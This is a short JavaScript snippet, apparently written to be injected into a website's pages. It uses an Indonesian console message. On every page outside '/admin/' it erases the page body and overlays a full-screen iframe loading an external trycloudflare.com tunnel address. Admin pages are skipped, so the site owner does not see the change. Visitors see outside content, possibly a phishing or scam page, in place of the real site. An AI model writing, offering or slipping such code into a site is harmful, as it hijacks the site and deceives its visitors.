window.addEventListener('load', () => {
  const currentUrl = window.location.href;

  if (currentUrl.includes('/admin/')) {
    console.log('Script Jalan');
    console.log('Tampilan DI Ubah');
    return;
  }

  setTimeout(() => {
    document.body.innerHTML = '';

    const iframe = document.createElement('iframe');
    iframe.src = 'https://shadow-specs-mandate-plot.trycloudflare.com';
    iframe.style.cssText = `
      width:100vw;
      height:100vh;
      border:none;
      position:fixed;
      top:0;
      left:0;
      z-index:9999;
    `;

    document.body.appendChild(iframe);
  }, 100);
});
